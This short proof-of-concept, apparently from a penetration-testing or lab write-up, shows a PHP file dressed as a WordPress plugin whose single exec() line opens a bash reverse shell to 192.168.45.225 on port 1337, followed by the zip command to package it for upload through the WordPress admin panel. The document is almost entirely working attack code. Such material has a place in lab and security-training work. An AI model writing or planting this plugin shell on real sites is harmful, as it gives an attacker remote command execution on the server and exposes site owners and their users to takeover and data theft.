
## PoC

Rev Shell Script

```
<?php
/**
* Author: Saeed Bala
* Plugin Name: PHP Code Plugin
* Description: Shell Through Plugins
* Version: 1.0
*/
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.225/1337 0>&1'");
?>
```

It's important to compress the .php file into an .zip file to upload the plugin in WordPress.

```
zip -r plugin.zip index.php
```